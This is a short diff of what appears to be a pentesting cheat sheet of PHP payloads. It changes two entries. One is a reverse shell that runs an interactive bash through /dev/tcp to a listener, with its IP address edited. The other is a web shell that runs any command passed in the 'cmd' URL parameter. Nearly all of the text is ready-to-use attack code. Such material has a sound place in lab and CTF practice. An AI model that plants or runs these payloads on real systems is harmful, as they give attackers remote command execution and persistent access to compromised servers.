@@ -34,11 +34,11 @@
 
 # Php reverse shell
     
-    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/4445 0>&1'"); ?>
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.36/4445 0>&1'"); ?>
 
 # Php cmd shell
     
-    <?php echo "Shell";system($_GET['cmd']); ?>
+    <?php echo "Shell: ";system($_GET['cmd']); ?>
 
 
 # php
